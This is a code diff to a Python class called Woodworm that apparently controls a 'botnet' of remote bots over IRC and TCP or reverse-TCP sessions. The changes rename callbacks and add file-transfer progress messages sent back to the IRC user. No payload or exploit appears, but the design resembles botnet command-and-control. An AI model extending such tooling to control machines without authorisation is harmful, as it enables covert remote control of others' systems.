@@ -95,10 +95,13 @@ class Woodworm:
                 bot.set_tcp_session(tcpSession)
                 bot.get_tcp_session().get_data_link().set_download_path(self.pathToFiles)
                 bot.get_tcp_session().identify(self.ircNick)
-                bot.get_tcp_session().onSendingFinished.subscribe(self.tcp_Session_onSendingFinished)
-                bot.get_reversed_tcp_session().onSendingFinished.subscribe(self.tcp_Session_onSendingFinished)
+                bot.get_tcp_session().onSendingFinished.subscribe(self.tcpSession_onSendingFinished)
+                bot.get_tcp_session().onSendingProgress.subscribe(self.tcpSession_onSendingProgress)
             else:
                 logging.error(f"Failed to TCP connect to bot: nick: {nick}, ip: {ip} port: {port}")
+
+            bot.get_reversed_tcp_session().onSendingFinished.subscribe(self.tcpSession_onSendingFinished)
+            bot.get_reversed_tcp_session().onSendingProgress.subscribe(self.tcpSession_onSendingProgress)
                                  
             self.botnetDB.add_bot(bot)
 
@@ -166,12 +169,12 @@ class Woodworm:
             return  
 
         if tcpSession.isSendingData:
-            await irc_connection.send_query(nickname, f"Bot {receiver} is busy")
+            await irc_connection.send_query(nickname, f"Bot {receiver} is busy sending other file")
             return
 
-        coro = asyncio.to_thread(tcpSession.send_file, file_path, owner=nickname, receiver=receiver)
+        coro = asyncio.to_thread(tcpSession.send_file, file_path, nickname=nickname, receiver=receiver)
         task = asyncio.create_task(coro)
-        # await irc_connection.send_query(nickname, f"File {filename} sent to {receiver} in {result['execution_time']} seconds, {result['tput']} MB/s")
+        await irc_connection.send_query(nickname, f"Transfer of {filename} to {receiver} started")
 
 
     async def irc_onCommandHELP(self, *args, **kwargs):
@@ -303,13 +306,24 @@ class Woodworm:
         logging.info(f"Reverse {linkType} connection established with nick: {nick}")
 
 
-    async def tcp_Session_onSendingFinished(self, *args, **kwargs):
+    async def tcpSession_onSendingFinished(self, *args, **kwargs):
         filename = kwargs.get('filename')
-        nickname = kwargs.get('owner')
+        nickname = kwargs.get('nickname')
         receiver = kwargs.get('receiver')
         tput = kwargs.get('tput')
         execution_time = kwargs.get('execution_time')
         await self.irc_connection.send_query(nickname, f"File {filename} sent to {receiver} in {execution_time} seconds, {tput} MB/s")
+
+
+    async def tcpSession_onSendingProgress(self, *args, **kwargs):
+        nickname = kwargs.get('nickname')
+        filename = kwargs.get('filename')
+        progress = kwargs.get('progress')
+        receiver = kwargs.get('receiver')
+        tput = kwargs.get('tput')
+        progress_size = kwargs.get('progress_size')
+        full_size = kwargs.get('full_size')
+        await self.irc_connection.send_query(nickname, f"Sending {filename} to {receiver}: {progress}%, {progress_size} out of {full_size} MB, Throughput: {tput} MB/s")
 
 
     async def another_loop(self):
